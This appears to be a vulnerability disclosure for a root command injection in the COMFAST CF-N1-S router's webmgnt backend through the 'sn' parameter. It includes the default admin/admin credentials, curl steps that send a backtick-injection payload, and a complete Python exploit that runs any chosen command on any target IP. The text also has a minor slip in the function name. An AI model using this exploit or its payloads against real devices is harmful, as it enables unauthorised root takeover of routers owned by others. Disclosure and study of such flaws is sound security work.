# **Command Injection Vulnerability in COMFAST CF-N1-S (V2.6.0.1) webmgnt Component via "sn" Parameter in sub_44AB34 Function**

**Overview**

- **Vendor:** COMFAST
- **Product:** CF-N1-S
- **Version:** V2.6.0.1
- **Type:** Command Injection
- **Product Usage:** Wireless Router
- **Architecture:** MIPS32r2 Big Endian
- **Affected Binary:** `/usr/bin/webmgnt`
- **Severity:** HIGH (CVSS 8.8)
- **Firmware Download:** https://www.comfast.com.cn/index.php?m=content&c=index&a=show&catid=31&id=779
- **Default Password:** admin

**Vulnerability Basic Information**

- **Vulnerable Function:** `sub_44AB34` (ptest_sn request handler inside the webmgnt CGI backend).
- **Vulnerability Point:** `popen()` executed right after an unsanitized `sprintf()` concatenation of user input into a shell command.
- **Trigger Endpoint:** `POST /cgi-bin/mbox-config?method=SET&section=ptest_sn`
- **Trigger Parameter:** `sn` (corresponds to `sn_value` in the code).
- **Authentication Requirement:** Yes (`COMFAST_SESSIONID` cookie).
- **Evidence Level:** VALIDATED
- **Prerequisites:**
  - The attacker possesses a valid login session (`COMFAST_SESSIONID` cookie).
  - The management interface (nginx reverse proxy) must be reachable so the request reaches the webmgnt FastCGI backend on `127.0.0.1:9002`.

**Vulnerability Description**

`webmgnt` is the CGI backend service of COMFAST routers. It listens on `127.0.0.1:9002` through the FastCGI protocol and is reverse-proxied by nginx to serve the Web management interface.

When handling the `ptest_sn` request, the `sub_44AB34` function retrieves the user-submitted `sn` parameter from the JSON request body and directly concatenates it into a shell command string without any filtering or sanitization. The resulting command is then executed through `popen`, which means the user-controlled `sn` value is passed to the shell and interpreted.

The core of the vulnerability lies in the complete absence of input validation: the `sn` value is inserted verbatim into the command buffer. An attacker only needs to embed shell metacharacters (backticks `` ` ``, `$()`, `;`, `|`, `&`, etc.) to break out of the intended `ptest setsn` command context and execute arbitrary commands on the device.

Since the command runs under the privileges of the `webmgnt` process, and the service runs as **root**, any injected command executes with root privileges (`uid=0(root)`), granting full Remote Code Execution (RCE) on the router.

**Vulnerability Code Snippet (Logic Reconstruction)**
<img width="1119" height="834" alt="image" src="https://github.com/user-attachments/assets/659aa603-7b49-4157-bf6f-475ece33323a" />


```
// webmgnt sub_44AB34 logic reconstruction
void ptest_sn_handler(char *json_body) {
    char *sn_value = json_get_value(json_body, "sn");  // Retrieve user input
    char cmd_buf[256];
    sprintf(cmd_buf, "ptest setsn %s", sn_value);      // 💥 Direct concatenation, no filtering
    popen(cmd_buf, "r");                                // Execute shell command
}
```

**Dangerous Function Call Chain:**

- `json_get_value()` → retrieves user-controlled input from the JSON body.
- `sprintf()` → concatenates the input into the command buffer.
- `popen()` → passes the command to the shell and executes it.

**Exploitation Chain (PoC Test)**

**Step 1: Obtain an Authenticated Session**

```bash
curl -X POST "http://127.0.0.1:8080/cgi-bin/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  -D headers.txt

# Extract the session from the response headers
SESSION=$(grep -oP 'COMFAST_SESSIONID=\K[^;]+' headers.txt)
```

Response:

```json
{"errCode":0,"errMsg":"OK","configDone":false}
```

Response Headers:

```
Set-Cookie: COMFAST_SESSIONID=7f000001-000000000000-643c9869; Path=/; Version=1
```

**Step 2: Send the Command Injection Payload**

```bash
curl -X POST "http://127.0.0.1:8080/cgi-bin/mbox-config?method=SET&section=ptest_sn" \
  -H "Content-Type: application/json" \
  -H "Cookie: COMFAST_SESSIONID=$SESSION" \
  -d '{"sn":"test`id>/tmp/vuln_sn`"}'
```

**Payload Breakdown:**

- `sn` parameter value: `test`id>/tmp/vuln_sn``
- The backtick-wrapped segment `` `id>/tmp/vuln_sn` `` is interpreted and executed by the shell.
- Actual command executed: `ptest setsn test`uid=0(root) gid=0(root)>/tmp/vuln_sn``

**Step 3: Server Response**

The server returns `502 Bad Gateway`, indicating the webmgnt process crashed after executing the injected command:

```html
<html>
<head><title>502 Bad Gateway</title></head>
<body bgcolor="white">
<center><h1>502 Bad Gateway</h1></center>
<hr><center>nginx/1.4.7</center>
</body>
</html>
```

**Step 4: Verify Successful Command Execution**

Check the `/tmp/vuln_sn` file inside the QEMU virtual machine:

```bash
# The file was created; its content is the output of the id command
cat /tmp/vuln_sn
uid=0(root) gid=0(root)
```

**Verification Evidence**

- **HTTP Response:** `502 Bad Gateway` (webmgnt crashed after execution).
- **File Created:** `/tmp/vuln_sn` exists inside the QEMU VM.
- **File Content:** `uid=0(root) gid=0(root)` — proves the command executed with root privileges.
- **Static Analysis:** IDA confirmed the `sprintf` → `popen` call chain inside `sub_44AB35`.

**Complete PoC**

```
import requests
import sys

def exploit(target, port=8080, command="id"):
    # Step 1: Login to get session
    login_url = f"http://{target}:{port}/cgi-bin/login"
    login_data = {"username": "admin", "password": "admin"}

    try:
        resp = requests.post(login_url, json=login_data, timeout=10)
        session_cookie = resp.cookies.get("COMFAST_SESSIONID")

        if not session_cookie:
            print("[-] Login failed, no session cookie received")
            return False

        print(f"[+] Session obtained: {session_cookie}")
    except Exception as e:
        print(f"[-] Login failed: {e}")
        return False

    # Step 2: Send command injection payload
    vuln_url = f"http://{target}:{port}/cgi-bin/mbox-config"
    params = {"method": "SET", "section": "ptest_sn"}
    payload = {"sn": f"test`{command}>/tmp/vuln_sn`"}
    headers = {"Cookie": f"COMFAST_SESSIONID={session_cookie}"}

    try:
        resp = requests.post(vuln_url, params=params, json=payload, headers=headers, timeout=10)

        if resp.status_code == 502:
            print("[+] Command injection successful (502 Bad Gateway)")
            print("[+] Check /tmp/vuln_sn inside the device for command output")
            return True
        else:
            print(f"[-] Unexpected response: {resp.status_code}")
            return False
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip> [command]")
        sys.exit(1)

    target = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "id"

    exploit(target, command=command)
```

<img width="1197" height="264" alt="image" src="https://github.com/user-attachments/assets/6377a818-1a6b-4385-b17c-b554653be45d" />

